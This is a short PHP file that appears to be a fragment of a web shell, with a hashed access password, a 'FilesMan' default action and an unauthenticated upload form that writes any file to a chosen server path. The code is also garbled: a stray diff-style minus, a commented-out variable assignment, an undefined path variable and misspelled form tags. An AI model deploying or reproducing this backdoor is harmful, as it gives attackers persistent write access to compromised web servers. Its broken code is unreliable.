<?php
-$auth_pass = md5('w0rnix');
$color = "ffff00";
$default_action = 'FilesMan';
$default_use_ajax = true;
$default_charset = 'Windows-1251';
#files = @$_FILES["files"];
	if ($files["name"] != '') {
	if (move_uploaded_file($files['tmp_name'], $fullpath)) {
	echo "<h1><a href= '$fullpath'>UP SUCCESSFUL CLICK HERE!</a></h1>";
		}
}echo '<html><head><title>UPLOAD PHP</title></head><body><from method=POST enctype="multipart/from-data" action=""><input type=text name=path><input type="file" name="files"><input type=submit value="Up"></from></body></html>';
?>
